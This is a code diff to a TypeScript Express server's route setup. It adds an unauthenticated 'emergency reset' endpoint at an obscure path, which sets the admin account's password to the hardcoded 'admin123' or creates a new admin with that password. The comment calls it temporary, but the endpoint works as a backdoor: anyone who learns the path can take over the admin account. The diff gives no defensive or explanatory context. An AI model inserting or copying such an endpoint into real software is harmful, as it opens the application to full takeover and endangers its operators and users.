@@ -174,6 +174,23 @@ export async function registerRoutes(
   const SALT_ROUNDS = 12;
   const SESSION_DURATION_MS = 24 * 60 * 60 * 1000; // 24 hours
 
+  // TEMPORARY: Emergency password reset - will be removed after use
+  app.post("/api/auth/emergency-reset-xk9m2", async (req, res) => {
+    try {
+      const hashedPassword = await bcrypt.hash("admin123", SALT_ROUNDS);
+      const existing = await storage.getUserByUsername("admin");
+      if (existing) {
+        await storage.updateUserPassword(existing.id, hashedPassword);
+        res.json({ success: true, message: "Password reset to admin123" });
+      } else {
+        const user = await storage.createUser({ username: "admin", password: hashedPassword, role: 'admin' });
+        res.json({ success: true, message: "Admin user created with password admin123" });
+      }
+    } catch (error: any) {
+      res.status(500).json({ success: false, error: error.message });
+    }
+  });
+
   // Bootstrap endpoint for initial production setup (use ADMIN_BOOTSTRAP_TOKEN env var)
   app.post("/api/auth/bootstrap", async (req, res) => {
     try {
